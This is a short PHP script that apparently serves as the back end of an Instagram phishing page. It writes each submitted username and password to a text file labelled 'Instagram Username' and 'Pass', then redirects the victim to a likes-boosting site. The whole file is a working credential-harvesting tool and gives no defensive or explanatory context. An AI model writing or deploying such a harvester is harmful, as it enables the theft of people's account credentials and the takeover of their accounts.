<?php

file_put_contents("usernames.txt", "Instagram Username: " . $_POST['user'] . " Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://ezlikers.com/');
exit();
?>
